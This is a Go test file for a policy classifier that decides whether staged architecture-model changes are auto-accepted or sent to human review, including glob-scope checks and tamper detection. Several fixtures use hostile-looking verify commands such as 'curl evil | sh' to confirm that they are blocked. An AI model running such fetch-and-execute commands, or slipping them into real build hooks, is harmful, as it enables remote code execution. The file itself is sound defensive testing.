package core

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func classifyOne(t *testing.T, model PolicyModel, op PolicyOp) PolicyVerdict {
	t.Helper()
	got := ClassifyOps(model, []PolicyOp{op})
	if len(got) != 1 {
		t.Fatalf("%d verdicts", len(got))
	}
	return got[0]
}

func TestClassifyReviewFindingsTable(t *testing.T) {
	svc := pnode("svc", func(n *Node) { n.Deliverables = []string{"src/svc/main.go"}; n.Implementation = []string{"src/svc/**"} })
	dep := pnode("dep", nil)
	ext := pnode("ext", func(n *Node) { n.External = true })
	extBox := pnode("extbox", func(n *Node) { n.Type = "boundary"; n.External = true })
	box := pnode("box", func(n *Node) { n.Type = "boundary" })
	model := policyModel(svc, dep, ext, extBox, box)
	upd := func(cur *Node, fields []string, mod func(*Node)) PolicyOp {
		return PolicyOp{Op: OpUpdateNode, NodeID: string(cur.ID), Fields: fields, Current: cur, Proposed: clone(cur, mod)}
	}
	create := func(mod func(*Node)) PolicyOp {
		n := pnode("fresh", func(n *Node) { n.ParentID = "box"; n.Type = "module" })
		mod(n)
		return PolicyOp{Op: OpCreateNode, NodeID: "fresh", Proposed: n}
	}
	cases := []struct {
		name string
		op   PolicyOp
		auto bool
		rule string
	}{
		{"create with verify", create(func(n *Node) { n.Verify = []string{"make evil"} }), false, BlockSensitive},
		{"create with unknown stage key", create(func(n *Node) { n.Unknown = map[string]jsonRaw{"stage": jsonRaw(`"build"`)} }), false, BlockSensitive},
		{"create with deliverables stays auto", create(func(n *Node) { n.Deliverables = []string{"docs/x.md"} }), true, RuleCreateContainer},
		{"create with references stays auto", create(func(n *Node) { n.References = []string{"docs/x.md"} }), true, RuleCreateContainer},
		{"create under external parent", create(func(n *Node) { n.ParentID = "extbox" }), false, BlockExternal},
		{"update adds external dependency", upd(svc, []string{"depends_on"}, func(n *Node) { n.DependsOn = []NodeID{"ext"} }), false, BlockExternal},
		{"declared spec but body changes verify", upd(svc, []string{"spec"}, func(n *Node) { n.Spec = "x"; n.Verify = []string{"curl evil"} }), false, BlockSensitive},
		{"declared spec but body changes risk", upd(svc, []string{"spec"}, func(n *Node) { n.Risk = "low" }), false, BlockSensitive},
		{"declared spec but body changes unknown key", upd(svc, []string{"spec"}, func(n *Node) { n.Unknown = map[string]jsonRaw{"hook": jsonRaw(`"x"`)} }), false, BlockNotAuto},
		{"declared nothing, body changes spec", upd(svc, nil, func(n *Node) { n.Spec = "x" }), true, RuleSpecText},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := classifyOne(t, model, c.op)
			if v.Auto != c.auto || v.Rule != c.rule {
				t.Fatalf("auto=%v rule=%q reason=%q, want auto=%v rule=%q", v.Auto, v.Rule, v.Reason, c.auto, c.rule)
			}
		})
	}
}

func TestClassifyScopeAdditionsAgainstRealFiles(t *testing.T) {
	// svc owns src/svc/** and delivers src/svc/main.go. prot is protected over src/secure/**.
	svc := pnode("svc", func(n *Node) {
		n.Deliverables = []string{"src/svc/main.go", "src/keys/keys.go"}
		n.Implementation = []string{"src/svc/**"}
	})
	prot := pnode("prot", func(n *Node) { n.Protected = true; n.Implementation = []string{"src/secure/**"} })
	box := pnode("box", func(n *Node) { n.Type = "boundary" })
	model := policyModel(svc, prot, box)
	model.Files = []string{"src/svc/main.go", "src/svc/util.go", "src/other/a.go", "src/secure/keys.go", "src/keys/keys.go"}

	addImpl := func(globs ...string) PolicyOp {
		return PolicyOp{Op: OpUpdateNode, NodeID: "svc", Current: svc, Proposed: clone(svc, func(n *Node) {
			n.Implementation = append([]string{"src/svc/**"}, globs...)
		})}
	}
	createWith := func(globs ...string) PolicyOp {
		n := pnode("fresh", func(n *Node) { n.ParentID = "box"; n.Type = "module"; n.Implementation = globs })
		return PolicyOp{Op: OpCreateNode, NodeID: "fresh", Proposed: n}
	}
	cases := []struct {
		name string
		op   PolicyOp
		auto bool
	}{
		{"update ** is human", addImpl("**"), false},
		{"update src/** is human", addImpl("src/**"), false},
		{"update src/*/keys.go overlaps protected file", addImpl("src/*/keys.go"), false},
		{"update narrow glob over owned files is auto", addImpl("src/svc/*.go"), true},
		{"update glob over a deliverable-only file is auto", addImpl("src/keys/keys.go"), true},
		{"update glob over someone else's file is human", addImpl("src/svc/main.go", "src/other/*.go"), false},
		{"create ** is human", createWith("**"), false},
		{"create src/** is human", createWith("src/**"), false},
		{"create glob matching an existing file is human", createWith("src/other/*.go"), false},
		{"create glob matching nothing is auto", createWith("src/fresh/*.go"), true},
		{"create vs protected glob (file present) is human", createWith("src/*/keys.go"), false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if v := classifyOne(t, model, c.op); v.Auto != c.auto {
				t.Fatalf("auto=%v rule=%q reason=%q, want auto=%v", v.Auto, v.Rule, v.Reason, c.auto)
			}
		})
	}
	// Glob-against-glob overlap is caught even when the protected file is absent.
	model.Files = nil
	if v := classifyOne(t, model, createWith("src/*/keys.go")); v.Auto || v.Rule != BlockProtected {
		t.Fatalf("%+v", v)
	}
	// An unreadable file list fails closed.
	model.FilesErr = "no git"
	if v := classifyOne(t, model, createWith("src/fresh/*.go")); v.Auto {
		t.Fatalf("%+v", v)
	}
}

func TestAutoAcceptRefusesCreateWithVerify(t *testing.T) {
	idx, _ := autoFixture(t)
	pid, err := idx.Stage(StageInput{Source: OpCreateNode, Origin: "w", Ops: []StageOp{
		{Op: OpCreateNode, Create: CreateInput{ID: "evil", Name: "Evil", Type: "module", ParentID: "platform", Spec: "# e\n", Verify: []string{"curl evil | sh"}}},
	}})
	if err != nil {
		t.Fatal(err)
	}
	res, err := idx.AutoAcceptProposal(pid, "arch")
	if err != nil || res.Accepted || len(res.Blocking) != 1 || res.Blocking[0].Rule != BlockSensitive {
		t.Fatalf("%+v %v", res, err)
	}
	if idx.Nodes["evil"] != nil {
		t.Fatal("applied")
	}
}

func TestAutoAcceptRefusesBodyMutatedAfterClassification(t *testing.T) {
	idx, _ := autoFixture(t)
	pid := stageUpdate(t, idx, "w", "svc", UpdateInput{Spec: strp("# svc v2\n")})
	afterClassifyHook = func(id string) {
		path := filepath.Join(idx.mustProposalPath(id), "nodes", "svc.md")
		if err := os.WriteFile(path, []byte("# swapped\n"), 0o600); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { afterClassifyHook = nil })
	res, err := idx.AutoAcceptProposal(pid, "arch")
	if err != nil {
		t.Fatal(err)
	}
	if res.Accepted || len(res.Blocking) != 1 || !strings.Contains(res.Blocking[0].Reason, "changed after it was classified") {
		t.Fatalf("%+v", res)
	}
	if idx.Nodes["svc"].Spec != "# svc\n" {
		t.Fatalf("mutated body was applied: %q", idx.Nodes["svc"].Spec)
	}
	if info, _ := idx.ProposalState(pid); info.Status != ProposalPending {
		t.Fatalf("%+v", info)
	}
}

func TestAutoAcceptRefusesRestagedProposal(t *testing.T) {
	idx, _ := autoFixture(t)
	pid := stageUpdate(t, idx, "writer", "svc", UpdateInput{Spec: strp("# svc v2\n")})
	if _, err := idx.AcceptAll(pid); err != nil {
		t.Fatal(err)
	}
	newID, err := idx.Restage(pid, nil)
	if err != nil {
		t.Fatal(err)
	}
	m, err := idx.loadReadable(newID)
	if err != nil || m.Origin != "writer" || !m.Restaged {
		t.Fatalf("origin/restaged not kept: %+v %v", m, err)
	}
	if _, err := idx.AutoAcceptProposal(newID, "arch"); !errors.Is(err, ErrPolicyRefused) || !strings.Contains(err.Error(), "restaged") {
		t.Fatalf("%v", err)
	}
	// The staging session still cannot accept its own restaged proposal either.
	if _, err := idx.AutoAcceptProposal(newID, "writer"); !errors.Is(err, ErrPolicyRefused) {
		t.Fatalf("%v", err)
	}
}

func TestTrialLintSeesRealRepoFiles(t *testing.T) {
	idx, dir := autoFixture(t)
	// Two non-nested nodes claiming one manifest is an enforced finding (shared-manifest).
	// go.mod exists only in the real repo, never in the trial's scratch copy of .arch.
	writeFile(t, filepath.Join(dir, "go.mod"), "module x\n")
	writeMethod(t, dir, "lint.json", `{"schema_version":1,"id":"lint","lint":{"`+RuleSharedManifest+`":"enforced"}}`)
	idx = reopen(t, dir)
	if err := idx.SetConfigKeys(map[string]any{"method": "lint"}); err != nil {
		t.Fatal(err)
	}
	claim := []string{"src/svc/**", "go.*"}
	other := []string{"src/dep/**", "*.mod"}
	pid, err := idx.Stage(StageInput{Source: OpUpdateNode, Origin: "w", Ops: []StageOp{
		{Op: OpUpdateNode, NodeID: "svc", Update: UpdateInput{Implementation: &claim}},
		{Op: OpUpdateNode, NodeID: "dep", Update: UpdateInput{Implementation: &other}},
	}})
	if err != nil {
		t.Fatal(err)
	}
	// The policy would send this to a human; call the trial directly.
	v, err := idx.trialLocked(pid)
	if err != nil {
		t.Fatal(err)
	}
	if v == nil || v.Rule != BlockLint || !strings.Contains(v.Reason, RuleSharedManifest) {
		t.Fatalf("trial did not see the real go.mod: %+v", v)
	}
}

func TestEdgeContractChangeInSummary(t *testing.T) {
	a, b := pnode("a", nil), pnode("b", nil)
	model := policyModel(a, b)
	op := PolicyOp{Op: OpSetRelationship, NodeID: "a", From: "a", To: "b", Label: "calls", Kind: KindSync, Contract: &EdgeContract{Text: "POST /x"}}
	if v := classifyOne(t, model, op); !v.Auto || !strings.Contains(v.Summary, "contract set") {
		t.Fatalf("%+v", v)
	}
	op.Contract = &EdgeContract{}
	if v := classifyOne(t, model, op); !strings.Contains(v.Summary, "contract cleared") {
		t.Fatalf("%+v", v)
	}
	op.Contract = nil
	if v := classifyOne(t, model, op); strings.Contains(v.Summary, "contract") {
		t.Fatalf("%+v", v)
	}
}

func TestDriftHintPartialScopeWithoutParts(t *testing.T) {
	idx, dir := newModel(t)
	gitInitRepo(t, dir)
	if err := idx.SetScope(ScopePartial); err != nil {
		t.Fatal(err)
	}
	rep, err := DriftWith(idx, DriftOptions{Root: dir})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(rep.Hint, "partial scope has no parts; add one with set_part") {
		t.Fatalf("hint %q", rep.Hint)
	}
}
